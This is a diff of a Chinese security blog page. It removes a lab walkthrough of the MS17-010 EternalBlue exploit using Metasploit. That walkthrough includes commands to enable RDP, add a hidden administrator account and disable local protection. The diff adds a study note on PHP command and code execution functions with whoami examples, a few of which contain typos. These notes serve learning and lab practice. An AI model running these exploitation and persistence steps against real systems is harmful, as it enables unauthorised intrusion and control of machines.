@@ -16,19 +16,18 @@
   <meta name="author" content="ZERO">
   <meta name="keywords" content="">
   
-    <meta name="description" content="MS17-010(Eternal blue永恒之蓝)漏洞背景永恒之蓝（EternalBlue）是一个由美国国家安全局（NSA）开发的漏洞利用工具，被用于攻击微软Windows操作系统中的漏洞。这个漏洞利用工具最初泄露于公众的是在2017年4月，因此得名“永恒之蓝” 具体来说，永恒之蓝利用了微软Windows操作系统中的一个名为MS17-010的漏洞，该漏洞存在于微软的SMBv1协议实现中。攻击者可">
+    <meta name="description" content="原文链接：https:&#x2F;&#x2F;paper.seebug.org&#x2F;3162&#x2F; 基础概念在计算机安全中，任意代码执行(RCE)是攻击者在目标机器或目标进程中运行攻击者选择的任何命令或代码的能力。任意代码执行漏洞是软件或硬件中允许任意代码执行的安全漏洞。设计来利用这种漏洞的程序被称为任意代码执行漏洞。通过网络(特别是通过Internet等广域网)触发任意代码执行的能力通常被称为远程代码执行(RCE) she">
 <meta property="og:type" content="article">
-<meta property="og:title" content="MS17-010(Eternal blue永恒之蓝)漏洞复现">
-<meta property="og:url" content="http://example.com/2024/05/29/ms17-010/index.html">
+<meta property="og:title" content="RCE总结">
+<meta property="og:url" content="http://example.com/2024/06/02/rce/index.html">
 <meta property="og:site_name" content="ZERO&#39;s Blog">
-<meta property="og:description" content="MS17-010(Eternal blue永恒之蓝)漏洞背景永恒之蓝（EternalBlue）是一个由美国国家安全局（NSA）开发的漏洞利用工具，被用于攻击微软Windows操作系统中的漏洞。这个漏洞利用工具最初泄露于公众的是在2017年4月，因此得名“永恒之蓝” 具体来说，永恒之蓝利用了微软Windows操作系统中的一个名为MS17-010的漏洞，该漏洞存在于微软的SMBv1协议实现中。攻击者可">
+<meta property="og:description" content="原文链接：https:&#x2F;&#x2F;paper.seebug.org&#x2F;3162&#x2F; 基础概念在计算机安全中，任意代码执行(RCE)是攻击者在目标机器或目标进程中运行攻击者选择的任何命令或代码的能力。任意代码执行漏洞是软件或硬件中允许任意代码执行的安全漏洞。设计来利用这种漏洞的程序被称为任意代码执行漏洞。通过网络(特别是通过Internet等广域网)触发任意代码执行的能力通常被称为远程代码执行(RCE) she">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="http://example.com/img/example.jpg">
-<meta property="article:published_time" content="2024-05-29T06:00:12.000Z">
-<meta property="article:modified_time" content="2024-05-30T04:54:28.898Z">
+<meta property="article:published_time" content="2024-06-02T10:40:00.000Z">
+<meta property="article:modified_time" content="2024-06-02T15:34:53.338Z">
 <meta property="article:author" content="ZERO">
-<meta property="article:tag" content="CVE">
-<meta property="article:tag" content="Windows漏洞">
+<meta property="article:tag" content="RCE">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="http://example.com/img/example.jpg">
   
@@ -36,7 +35,7 @@
     <meta name="referrer" content="no-referrer-when-downgrade">
   
   
-  <title>MS17-010(Eternal blue永恒之蓝)漏洞复现 - ZERO&#39;s Blog</title>
+  <title>RCE总结 - ZERO&#39;s Blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -241,7 +240,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="MS17-010(Eternal blue永恒之蓝)漏洞复现"></span>
+            <span id="subtitle" data-typed-text="RCE总结"></span>
           
         </div>
 
@@ -252,8 +251,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2024-05-29 14:00" pubdate>
-          2024年5月29日 下午
+        <time datetime="2024-06-02 18:40" pubdate>
+          2024年6月2日 晚上
         </time>
       </span>
     
@@ -264,7 +263,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          1.1k 字
+          1.8k 字
         
       </span>
     
@@ -275,7 +274,7 @@
         
         
         
-          10 分钟
+          16 分钟
         
       </span>
     
@@ -312,86 +311,52 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">MS17-010(Eternal blue永恒之蓝)漏洞复现</h1>
+            <h1 id="seo-header">RCE总结</h1>
             
             
               <div class="markdown-body">
                 
-                <h1 id="MS17-010-Eternal-blue永恒之蓝"><a href="#MS17-010-Eternal-blue永恒之蓝" class="headerlink" title="MS17-010(Eternal blue永恒之蓝)"></a>MS17-010(Eternal blue永恒之蓝)</h1><h2 id="漏洞背景"><a href="#漏洞背景" class="headerlink" title="漏洞背景"></a>漏洞背景</h2><p>永恒之蓝（EternalBlue）是一个由美国国家安全局（NSA）开发的漏洞利用工具，被用于攻击微软Windows操作系统中的漏洞。这个漏洞利用工具最初泄露于公众的是在2017年4月，因此得名“永恒之蓝”</p>
-<p>具体来说，永恒之蓝利用了微软Windows操作系统中的一个名为MS17-010的漏洞，该漏洞存在于微软的SMBv1协议实现中。攻击者可以利用这个漏洞来远程执行恶意代码，甚至控制受感染的计算机，而无需用户交互</p>
-<p>攻击者可以利用永恒之蓝进行各种恶意活动，包括勒索软件攻击、间谍活动、信息窃取等。该漏洞被广泛利用，导致了全球范围内的许多严重的网络安全事件，包括2017年的“想象力病毒”（WannaCry）攻击事件</p>
-<p>微软在发现漏洞后发布了补丁来修复这个问题，并呼吁用户及时更新其系统以保护自己免受潜在的攻击。然而，由于许多用户未能及时更新其系统，永恒之蓝仍然是一个潜在的威胁，特别是对于那些运行旧版本Windows系统的用户。因此，及时更新系统补丁并采取其他安全措施仍然是保护自己免受此类攻击的最佳做法之一</p>
-<h2 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h2><h3 id="前期探测"><a href="#前期探测" class="headerlink" title="前期探测"></a>前期探测</h3><p>本次的漏洞环境是上课老师提供的靶场，要求我们去扫描C段，查找存活的IP并尝试利用其存在的相关漏洞</p>
-<p>我最初尝试使用goby进行扫描，也是最早通过它报警漏洞发现192.168.12.8的445开放，且可能存在MS17-010，之后使用nmap和fscan以及nessus扫描验证，确认192.168.12.8以及其他数十个IP存在MS17-010漏洞</p>
-<p>nmap批量扫描：</p>
-<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nmap</span> -p445 --script smb-vuln-ms17-<span class="hljs-number">010</span> <span class="hljs-number">192.168.12.0</span>/<span class="hljs-number">24</span><br></code></pre></td></tr></table></figure>
+                <p><strong>原文链接：<a target="_blank" rel="noopener" href="https://paper.seebug.org/3162/">https://paper.seebug.org/3162/</a></strong></p>
+<h1 id="基础概念"><a href="#基础概念" class="headerlink" title="基础概念"></a>基础概念</h1><p>在计算机安全中，任意代码执行(RCE)是攻击者在目标机器或目标进程中运行攻击者选择的任何命令或代码的能力。任意代码执行漏洞是软件或硬件中允许任意代码执行的安全漏洞。设计来利用这种漏洞的程序被称为任意代码执行漏洞。通过网络(特别是通过Internet等广域网)触发任意代码执行的能力通常被称为远程代码执行(RCE)</p>
+<h2 id="shell符号使用"><a href="#shell符号使用" class="headerlink" title="shell符号使用"></a>shell符号使用</h2><p>在执行命令当中，我们会用到很多的shell符号，符号的用法如下：</p>
+<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs 1c">cmd1 <span class="hljs-string">| cmd2 只执行cmd2 </span><br>cmd1 <span class="hljs-string">|| cmd2 只有当cmd1执行失败后，cmd2才被执行 </span><br>cmd1 <span class="hljs-meta">&amp; cmd2 先执行cmd1，不管是否成功，都会执行cmd2 </span><br>cmd1 <span class="hljs-meta">&amp;&amp; cmd2 先执行cmd1，cmd1执行成功后才执行cmd2，否则不执行cmd2</span><br></code></pre></td></tr></table></figure>
 
-<p>fscan定点扫描：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./fscan -h 192.168.12.8<br></code></pre></td></tr></table></figure>
+<p>Linux中支持分号进行拼接执行：</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">cmd1</span> ; <span class="hljs-attribute">cmd2</span> <br></code></pre></td></tr></table></figure>
 
-<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>打开msfconsole终端，搜索MS17-010的相关漏洞</p>
-<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">search</span> ms17-<span class="hljs-number">010</span><br></code></pre></td></tr></table></figure>
+<p>PHP中支持<code>反引号</code>拼接执行</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> `whoami`;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
 
-<p>在搜索到的相关模块中，选择<code>exploit/windows/smb/ms17_010_eternalblue</code></p>
-<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-keyword">use</span> exploit/windows/smb/ms17_010_eternalblue<br><span class="hljs-comment">#或者</span><br><span class="hljs-keyword">use</span> <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure>
+<h1 id="常规RCE"><a href="#常规RCE" class="headerlink" title="常规RCE"></a>常规RCE</h1><h2 id="基础RCE"><a href="#基础RCE" class="headerlink" title="基础RCE"></a>基础RCE</h2><h3 id="PHP基础命令-代码执行函数"><a href="#PHP基础命令-代码执行函数" class="headerlink" title="PHP基础命令&#x2F;代码执行函数"></a>PHP基础命令&#x2F;代码执行函数</h3><p>该方式最为常见，也是最为经典的方式，开发者因为没有对命令执行函数进行过滤，导致用户可以恶意传参造成的RCE</p>
+<p>PHP下直接执行<strong>系统命令</strong>的函数如下：</p>
+<p><strong>exec：</strong>用于执行一个外部命令。它只返回命令的最后一行输出。可以通过一个可选的参数来获取命令的所有输出。还可以通过另一个可选的参数来获取命令的返回状态</p>
+<p><strong>shell_exec：</strong>同样用于执行外部命令。会返回命令的完整输出作为一个字符串。不提供命令的返回状态</p>
+<p><strong>system：</strong>也是用于执行外部命令。它会立即显示输出（适合用于产生大量输出的命令）。返回命令的最后一行输出。可以通过一个可选的参数来获取命令的返回状态</p>
+<p><strong>passthru：</strong>用于执行外部命令，并直接将原始输出传递给浏览器。常用于执行二进制文件或者需要直接传递数据流的情况（例如，输出图像或音频流）。不返回任何输出，但可以通过一个可选的参数来获取命令的返回状态</p>
+<p><strong>反引号：</strong>一种简便的语法，用于在PHP代码中直接执行外部命令。类似于<code>shell_exec</code>，会捕获并返回命令的完整输出</p>
+<p><strong>popen：</strong>用于打开一个到外部命令的管道。允许你与外部命令进行读或写操作（但不同时支持两者）。返回一个文件指针，可用于进一步的 fread 或 fwrite 操作。使用 pclose 来关闭管道并获取命令的退出状态</p>
+<p><strong>ob_start：</strong>PHP 的一个函数，用于开启输出缓冲。这意味着脚本的输出（如 echo）不会立即发送到浏览器，而是存储在内部缓冲区中。这允许在输出发送到浏览器前对其进行修改。使用 <code>ob_end_flush()</code> 来发送缓冲区内容至浏览器。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&#x27;echo 1&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">shell_exec</span>(<span class="hljs-string">&#x27;echo 2&#x27;</span>);<br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;echo 3&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">passthru</span>(<span class="hljs-string">&#x27;echo 4&#x27;</span>);<br><span class="hljs-keyword">echo</span> `<span class="hljs-keyword">echo</span> <span class="hljs-number">5</span>`;<br><br><span class="hljs-variable">$test</span> = <span class="hljs-title function_ invoke__">popen</span>(<span class="hljs-string">&#x27;echo 6&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$test</span>)&#123;<br>    <span class="hljs-keyword">while</span>(!<span class="hljs-title function_ invoke__">feof</span>(<span class="hljs-variable">$test</span>))&#123;<br>        <span class="hljs-variable">$line</span> = <span class="hljs-title function_ invoke__">fgets</span>(<span class="hljs-variable">$test</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$line</span>;<br>    &#125;<br>    <span class="hljs-title function_ invoke__">pclose</span>(<span class="hljs-variable">$test</span>);<br>&#125;<br><br><span class="hljs-title function_ invoke__">ob_start</span>(<span class="hljs-string">&quot;echo&quot;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;7&quot;</span>;<br><span class="hljs-title function_ invoke__">ob_end_flush</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
 
-<p>设置Payload</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">set</span> payload windows/x64/meterpreter/bind_tcp<br></code></pre></td></tr></table></figure>
+<p><strong>执行PHP代码</strong>的命令如下：</p>
+<p><strong>eval：</strong>用于执行一个字符串作为 PHP 代码。可以执行任何有效的 PHP 代码片段。没有返回值，除非在执行的代码中明确返回</p>
+<p><strong>assert：</strong>用于测试一个表达式是否为真。如果表达式为假，会抛出一个警告或异常（取决于 PHP 配置）。通常用于调试和测试目的</p>
+<p><strong>注意！！！</strong>此函数在在PHP8已经被移除了，以下是官方介绍：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">assert</span>(<span class="hljs-keyword">mixed</span><span class="hljs-variable">$assertion</span>, <span class="hljs-built_in">Throwable</span>|<span class="hljs-keyword">string</span>|<span class="hljs-literal">null</span> <span class="hljs-variable">$description</span> = <span class="hljs-literal">null</span>): <span class="hljs-keyword">bool</span><br></code></pre></td></tr></table></figure>
 
-<p><strong>注意！</strong></p>
-<p>网上大多数教程中，要求设置的Payload为：<code>set payload windows/meterpreter/reverse_tcp</code> 但在我的实验环境中，使用此Payload并未成功，具体分析为：</p>
-<p><strong>reverse_tcp：</strong>攻击机设置一个端口（LPORT）和IP（LHOST），Payload在测试机执行连接攻击机IP的端口，这时如果在攻击机监听该端口会发现测试机已经反向连接</p>
-<p><strong>bind_tcp：</strong>攻击机设置一个端口（LPORT），Payload在测试机执行打开该端口，以便攻击机可以接入</p>
-<p>基于TCP的正向连接shell，因为在内网跨网段时无法连接到attack的机器，所以在内网中经常会使用，不需要设置LHOST</p>
-<p>查看需要填写的相关参数、载荷等</p>
-<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">show</span> <span class="hljs-keyword">options</span><br></code></pre></td></tr></table></figure>
+<p>assertion可以是任何带返回值的表达式，运行后的结果用于表示断言成功还是失败。警告在 PHP 8.0.0 之前，如果assertion 是 <code>string</code>，将解释为 PHP 代码，并通过 <code>eval()</code> 执行。这个字符串将作为第三个参数传递给回调函数。这种行为在 PHP 7.2.0 中弃用，并在 PHP 8.0.0 中移除</p>
+<p><strong>call_user_func：</strong>用于调用一个回调函数，该函数可以是一个函数名或闭包。可以传递多个参数给回调函数。返回回调函数的返回值。适用于动态函数调用</p>
+<p><strong>create_function：</strong>用于创建匿名（lambda-style）函数。接受两个字符串参数：参数列表和函数体。返回一个匿名函数的引用</p>
+<p><strong>注意！！！</strong>同assert，已在PHP7.2弃用，PHP8.0被移除</p>
+<p><strong>array_map：</strong>用于将回调函数应用于数组的每个元素。接受一个回调函数和一个或多个数组。返回一个新数组，数组元素是回调函数应用于原始元素的结果。适用于转换或处理数组元素</p>
+<p><strong>call_user_func_array：</strong>用于调用回调函数，并将参数作为数组传递。接受两个参数：回调函数和参数数组。返回回调函数的返回值。适用于动态参数数量的函数调用</p>
+<p><strong>usort：</strong>用于对数组进行自定义排序，接受数组和比较函数作为参数。比较函数确定元素间的排序顺序，排序后的数组不保留原始键名。适用于根据用户定义的规则排序数组元素</p>
+<p><strong>array_filter：</strong>用于过滤数组元素，接受数组和可选的回调函数作为参数。如果提供回调函数，仅包含回调返回真值的元素；否则，移除所有等同于false的元素。适用于基于条件移除数组中的元素</p>
+<p><strong>array_reduce：</strong>用于迭代一个数组，并通过回调函数将数组的元素逐一减少到单一值。接受三个参数：一个数组、一个回调函数和一个可选的初始值。回调函数接受两个参数：一个是携带结果的累加器，另一个是当前数组元素。返回通过累加器得到的最终值</p>
+<p><strong>preg_replace：</strong>用于执行正则表达式的搜索和替换。接受三个参数：模式（正则表达式）、替换值和目标字符串。可以是单个字符串或数组。返回修改后的字符串或数组。适用于基于模式匹配修改文本内容。(&#x2F;e的代码执行版本在5.6版本后被移除)</p>
+<p><strong>$符号：</strong>在 PHP 中，<code>$&#123;&#125;</code> 语法本质上是用于复杂的变量解析，通常在字符串内用来解析变量或表达式。然而，在一些特殊情况下，如果配合 eval 或其他动态执行代码的功能，<code>$&#123;&#125;</code> 可以被用来间接执行代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//eval</span><br><span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;system(whoami);&#x27;</span>);<br><span class="hljs-comment">//assert</span><br><span class="hljs-title function_ invoke__">assert</span>(<span class="hljs-string">&#x27;system(whoami)&#x27;</span>);<br><span class="hljs-comment">//call_user_func</span><br><span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-string">&quot;assert&quot;</span>,<span class="hljs-string">&#x27;system(whoami)&#x27;</span>);<br><span class="hljs-comment">//create_function</span><br><span class="hljs-variable">$command1</span> = <span class="hljs-title function_ invoke__">create_function</span>(<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-string">&#x27;system(whoami);&#x27;</span>);<br><span class="hljs-variable">$command1</span>();<br><span class="hljs-comment">//array_map</span><br><span class="hljs-variable">$command2</span> = [<span class="hljs-string">&#x27;whoami&#x27;</span>];<br><span class="hljs-title function_ invoke__">array_map</span>(<span class="hljs-string">&#x27;system&#x27;</span>,<span class="hljs-variable">$command2</span>);<br><span class="hljs-comment">//call_user_func_array</span><br><span class="hljs-variable">$command3</span> = <span class="hljs-string">&#x27;system&#x27;</span>;<br><span class="hljs-variable">$arguments</span> = [<span class="hljs-string">&#x27;whoami&#x27;</span>];<br><span class="hljs-title function_ invoke__">call_user_func_array</span>(<span class="hljs-variable">$command3</span>,<span class="hljs-variable">$arguments</span>);<br><span class="hljs-comment">//usort</span><br><span class="hljs-variable">$command4</span> = [<span class="hljs-string">&#x27;whoami&#x27;</span>,<span class="hljs-string">&#x27;0&#x27;</span>];<br><span class="hljs-title function_ invoke__">usort</span>(<span class="hljs-variable">$commnand4</span>,<span class="hljs-string">&#x27;system&#x27;</span>);<br><span class="hljs-comment">//array_filter</span><br><span class="hljs-variable">$command5</span> = [<span class="hljs-string">&#x27;whoami&#x27;</span>];<br><span class="hljs-title function_ invoke__">array_filter</span>(command5,<span class="hljs-string">&#x27;system&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
 
-<p>设置目标被攻击主机的IP</p>
-<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-keyword">set</span> RHOSTS 被攻击机<span class="hljs-comment">IP</span><br></code></pre></td></tr></table></figure>
-
-<p>设置监听主机IP</p>
-<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-keyword">set</span> LHOST 本机<span class="hljs-comment">IP</span><br></code></pre></td></tr></table></figure>
-
-<p>设置监听端口</p>
-<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-keyword">set</span> LPORT 本机端口<br></code></pre></td></tr></table></figure>
-
-<p>开始攻击</p>
-<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">run</span><br><span class="hljs-comment">#或者</span><br>exploit<br></code></pre></td></tr></table></figure>
-
-<p><strong>注意！</strong></p>
-<p>开始攻击前，请确保本机的相关防护程序关闭，否则它们会变成内鬼</p>
-<p><img src="/img/ms17_010_1.png" srcset="/img/loading.gif" lazyload alt="ms17_010_1"></p>
-<p>当出现<code>WIN</code>则表面漏洞利用成功</p>
-<p><img src="/img/ms17_010_2.png" srcset="/img/loading.gif" lazyload alt="ms17_010_2"></p>
-<p>这边我尝试<code>getuid</code>查询用户，发现拿到的是系统权限</p>
-<p>在<code>shell</code>后，查看ipconfig</p>
-<p><img src="/img/ms17_010_3.png" srcset="/img/loading.gif" lazyload alt="ms17_010_3"></p>
-<p><img src="/img/ms17_010_4.png" srcset="/img/loading.gif" lazyload alt="ms17_010_4"></p>
-<p>使用screenshot还可以截取被攻击机器当前的屏幕截图</p>
-<p><img src="/img/ms17_010_5.png" srcset="/img/loading.gif" lazyload alt="ms17_010_5"></p>
-<p>利用拿到的<code>shell</code>查看被攻击机器所开放的端口</p>
-<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">netstat -an</span><br></code></pre></td></tr></table></figure>
-
-<p>发现3389端口没有开放，手动给它打开</p>
-<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">wmic RDTOGGLE WHERE ServerName=<span class="hljs-string">&#x27;%COMPUTERNAME%&#x27;</span> call SetAllowTSConnections <span class="hljs-number">1</span><br><span class="hljs-comment">#或者</span><br>REG <span class="hljs-keyword">ADD</span><span class="language-bash"> HKLM\SYSTEM\CurrentControlSet\Control\Terminal<span class="hljs-string">&quot; &quot;</span>Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</span><br></code></pre></td></tr></table></figure>
-
-<p>显示<code>successful</code>即为成功</p>
-<p>再次确认3389端口是否开启</p>
-<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">netstat -an|<span class="hljs-built_in">find</span> <span class="hljs-string">&quot;3389&quot;</span><br></code></pre></td></tr></table></figure>
-
-<p>显示LISTENING即为监听中</p>
-<p><strong>注意！</strong></p>
-<p>远程桌面的默认端口是3389，为了防止管理员更改了远程端口给我们连接带来意想不到的情况，需要通过查看注册表键值确认远程桌面的端口是否为3389</p>
-<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">REG</span> <span class="hljs-keyword">QUERY</span> <span class="hljs-string">&quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot;</span> /v PortNumber<br></code></pre></td></tr></table></figure>
-
-<p>若出现为0xd3d为正常，0xd3d为16进制的3389</p>
-<p>添加一个新的用户</p>
-<figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">net <span class="hljs-keyword">user</span> <span class="hljs-title">用户名 密码 /add</span><br></code></pre></td></tr></table></figure>
-
-<p>将新建的用户添加进管理员组</p>
-<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm">net localgroup administrators 用户名 /<span class="hljs-keyword">add</span><br></code></pre></td></tr></table></figure>
-
-<p>成功连接远程桌面</p>
 
                 
               </div>
@@ -410,7 +375,7 @@
     
       <span class="category-chain">
         
-  <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="category-chain-item">漏洞复现</a>
+  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="category-chain-item">学习笔记</a>
   
   
 
@@ -425,9 +390,7 @@
     <div class="post-meta">
       <i class="iconfont icon-tags"></i>
       
-        <a href="/tags/CVE/" class="print-no-link">#CVE</a>
-      
-        <a href="/tags/Windows%E6%BC%8F%E6%B4%9E/" class="print-no-link">#Windows漏洞</a>
+        <a href="/tags/RCE/" class="print-no-link">#RCE</a>
       
     </div>
   
@@ -439,8 +402,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>MS17-010(Eternal blue永恒之蓝)漏洞复现</div>
-      <div>http://example.com/2024/05/29/ms17-010/</div>
+      <div>RCE总结</div>
+      <div>http://example.com/2024/06/02/rce/</div>
     </div>
     <div class="license-meta">
       
@@ -452,7 +415,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2024年5月29日</div>
+          <div>2024年6月2日</div>
         </div>
       
       
@@ -484,18 +447,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2024/06/02/rce/" title="RCE总结">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">RCE总结</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2024/05/28/htb-WsTodo/" title="HTB_No-Threshold">
-                        <span class="hidden-mobile">HTB_No-Threshold</span>
+                      <a href="/2024/05/29/ms17-010/" title="MS17-010(Eternal blue永恒之蓝)漏洞复现">
+                        <span class="hidden-mobile">MS17-010(Eternal blue永恒之蓝)漏洞复现</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
